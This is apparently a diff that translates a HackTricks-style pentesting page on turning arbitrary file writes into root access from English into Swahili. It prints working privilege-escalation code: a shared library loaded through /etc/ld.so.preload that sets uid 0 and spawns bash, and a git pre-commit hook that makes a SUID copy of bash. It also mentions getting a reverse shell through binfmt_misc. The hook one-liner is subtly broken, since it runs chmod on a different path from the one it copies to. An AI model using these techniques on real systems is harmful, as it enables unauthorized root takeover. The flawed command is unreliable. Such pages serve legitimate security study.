@@ -1,40 +1,36 @@
-# Arbitrary File Write to Root
+# Kuandika Faili kwa Msingi
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ### /etc/ld.so.preload
 
-This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\
-If you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.
+Faili hii inafanya kazi kama **`LD_PRELOAD`** env variable lakini pia inafanya kazi katika **SUID binaries**.\
+Ikiwa unaweza kuunda au kubadilisha, unaweza kuongeza tu **njia ya maktaba ambayo itapakiwa** na kila binary inayotekelezwa.
 
-For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`
-
+Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
 
 void _init() {
-    unlink("/etc/ld.so.preload");
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
+unlink("/etc/ld.so.preload");
+setgid(0);
+setuid(0);
+system("/bin/bash");
 }
 //cd /tmp
 //gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-
 ### Git hooks
 
-[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are **scripts** that are **run** on various **events** in a git repository like when a commit is created, a merge... So if a **privileged script or user** is performing this actions frequently and it's possible to **write in the `.git` folder**, this can be used to **privesc**.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) ni **scripts** ambazo zina **endesha** kwenye **matukio** mbalimbali katika hazina ya git kama wakati **commit** inaundwa, **merge**... Hivyo kama **script au mtumiaji mwenye mamlaka** anafanya vitendo hivi mara kwa mara na inawezekana **kuandika kwenye folda ya `.git`**, hii inaweza kutumika kwa **privesc**.
 
-For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
-
+Kwa mfano, inawezekana **kuunda script** katika hazina ya git kwenye **`.git/hooks`** ili kila wakati ifanyike wakati **commit** mpya inaundwa:
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
 ```
-
 ### Cron & Time files
 
 TODO
@@ -45,6 +41,6 @@ TODO
 
 ### binfmt_misc
 
-The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.
+Fail iliyoko katika `/proc/sys/fs/binfmt_misc` inaonyesha ni binary ipi inapaswa kutekeleza aina gani ya faili. TODO: angalia mahitaji ya kutumia hii kutekeleza rev shell wakati aina ya faili ya kawaida imefunguliwa.
 
 {{#include ../../banners/hacktricks-training.md}}
